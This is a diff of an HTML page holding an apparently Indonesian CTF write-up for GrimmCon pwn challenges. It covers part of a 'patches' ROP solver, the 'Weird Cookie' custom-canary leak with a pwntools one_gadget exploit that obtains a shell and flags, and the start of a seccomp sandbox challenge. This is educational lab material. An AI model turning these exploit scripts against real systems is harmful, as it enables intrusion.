-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -487,43 +281,8 @@ gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;
     <span style="color:#66d9ef">else</span>:
         r <span style="color:#f92672">=</span> process(ELF_PATH, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
     exploit(r)
-</code></pre></td></tr></table>
-</div>
-</div><p>Setelah leak didapatkan, tinggal rop di libc.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python solver.py <span style="color:#ae81ff">31322</span>
+</code></pre></div><p>Setelah leak didapatkan, tinggal rop di libc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python solver.py <span style="color:#ae81ff">31322</span>
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/abdullahnz/ctf/grimmcon/pwn/patches/patches&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -552,47 +311,19 @@ $ cat flag.txt
 flag<span style="color:#f92672">{</span>499c6288c77f297f4fd87db8e442e3f0<span style="color:#f92672">}</span>
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to challenge.ctf.games port <span style="color:#ae81ff">31322</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="flag-1">Flag</h2>
+</code></pre></div><h2 id="flag-1">Flag</h2>
 <p><code>flag{499c6288c77f297f4fd87db8e442e3f0}</code></p>
 <h1 id="weird-cookie-500-pts">Weird Cookie [500 pts]</h1>
 <h2 id="the-main-function">the main function</h2>
 <p>Intinya soal ini seperti pada judulnya. Dimana terdapat custom canary yang ditempatkan di variable setelah input buffer. Seperti canary pada umumnya, jika berubah, maka <code>__stack_chk_fail</code> akan dipanggil. Tetapi pada kasus ini, program akan exit.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 {
     <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [sp+0h] [bp-30h]@1
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [sp+28h] [bp-8h]@1
 </span><span style="color:#75715e"></span>
     setup(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>argc, argv, envp);
-    v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>printf <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x123456789ABCDEF1LL</span>;
-    saved_canary <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>printf <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x123456789ABCDEF1LL</span>;
+<span style="display:block;width:100%;background-color:#3c3d38">    v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>printf <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x123456789ABCDEF1LL</span>;
+</span>    saved_canary <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>printf <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x123456789ABCDEF1LL</span>;
     memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x28uLL</span>);
     puts(<span style="color:#e6db74">&#34;Do you think you can overflow me?&#34;</span>);
     read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x40uLL</span>);
@@ -600,87 +331,30 @@ flag<span style="color:#f92672">{</span>499c6288c77f297f4fd87db8e442e3f0<span st
     memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x28uLL</span>);
     puts(<span style="color:#e6db74">&#34;Are you sure you overflowed it right? Try again.&#34;</span>);
     read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x40uLL</span>);
-    <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">!=</span> saved_canary )
-    {
+<span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">!=</span> saved_canary )
+</span>    {
         puts(<span style="color:#e6db74">&#34;Nope. :(&#34;</span>);
         exit(<span style="color:#ae81ff">0</span>);
     }
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
-</code></pre></td></tr></table>
-</div>
-</div><p>Canary merupakan hasil xor antara fungsi printf dan suatu nilai (katakan X).</p>
+</code></pre></div><p>Canary merupakan hasil xor antara fungsi printf dan suatu nilai (katakan X).</p>
 <p>Oke, karena input pakai read. Read itu tidak mengakhiri buffer dengan <em>nullbyte</em>. Nah, jika buffer sampai canary tidak mengandung <em>nullbyte</em>, maka, canary akan ikut ter-<em>puts</em> bersamaan dengan input buffer kita. Karena <em>puts</em> itu terminate dengan <em>nullbyte</em>.</p>
 <p>Sebagai contoh, dibawah ini.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python -c <span style="color:#e6db74">&#39;import sys; sys.stdout.write(&#34;A&#34; * 0x28)&#39;</span> | ./weird_cookie
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python -c <span style="color:#e6db74">&#39;import sys; sys.stdout.write(&#34;A&#34; * 0x28)&#39;</span> | ./weird_cookie
 
 <span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  |AAAAAAAAAAAAAAAA|
 <span style="color:#ae81ff">00000010</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  |AAAAAAAAAAAAAAAA|
 <span style="color:#ae81ff">00000020</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  d2 b1 <span style="color:#ae81ff">18</span> 6d <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">12</span>  |AAAAAAAA...m.<span style="color:#f92672">)</span>4.|
 <span style="color:#ae81ff">00000030</span>  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">55</span>        ^^                       |.RUUUU|
-</code></pre></td></tr></table>
-</div>
-</div><p>Karena xor mempunyai sifat yang reverseable, leak libc disini didapatkan dengan xor antara canary dengan nilai X tadi. Atau lebih jelasnya,</p>
+</code></pre></div><p>Karena xor mempunyai sifat yang reverseable, leak libc disini didapatkan dengan xor antara canary dengan nilai X tadi. Atau lebih jelasnya,</p>
 <blockquote>
 <p>A ⊕ B = C dan C ⊕ B = A</p>
 </blockquote>
 <p>Karena overflow hanya 24 byte, dan 16 byte untuk canary dan padding untuk sampai RIP. Jadi untuk ROP sendiri itu hanya 8 byte. Jadi, ret-to-libc dengan system disini tidak bisa dilakukan. Karena harus set parameter dulu yang butuh minimal 24 bytes.</p>
 <p>Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. <em>Fyi</em>, semenjak saya masuk di libc 2.31, one_gadget hook tidak bisa dilakukan :'(.</p>
 <p>Full solver,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -719,31 +393,8 @@ gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;
     <span style="color:#66d9ef">else</span>:
         r <span style="color:#f92672">=</span> process(ELF_PATH, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
     exploit(r)
-</code></pre></td></tr></table>
-</div>
-</div><p>Run and got the flag~.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python solver.py <span style="color:#ae81ff">30824</span>
+</code></pre></div><p>Run and got the flag~.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python solver.py <span style="color:#ae81ff">30824</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to challenge.ctf.games on port 30824: Done
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LEAK 0x7fec3b993f70
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LIBC 0x7fec3b92f000
@@ -760,134 +411,44 @@ drwxr-xr-x <span style="color:#ae81ff">1</span> root <span style="color:#ae81ff"
 ---x--x--x <span style="color:#ae81ff">1</span> root <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">17000</span> Dec <span style="color:#ae81ff">28</span> 19:25 weird_cookie
 $ cat flag.txt
 flag<span style="color:#f92672">{</span>e87923d7cd36a8580d0cf78656d457c6<span style="color:#f92672">}</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="flag-2">Flag</h2>
+</code></pre></div><h2 id="flag-2">Flag</h2>
 <p><code>flag{e87923d7cd36a8580d0cf78656d457c6}</code></p>
 <h1 id="sanded-box-500pts">Sanded Box [500pts]</h1>
 <blockquote>
 <p>I set up a secure environment for users to execute shellcode. Now nobody will be able to get the flag!</p>
 </blockquote>
 <p>Disini diberi binary sandbox dan source code php yang akan menjalankan <code>./run_sanbox [file upload from user]</code>. Didalam sandbox, terdapat library seccomp yang digunakan untuk meng-handle syscall dari childnya.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">line  CODE  JT   JF      K
-<span style="color:#f92672">=================================</span>
-<span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
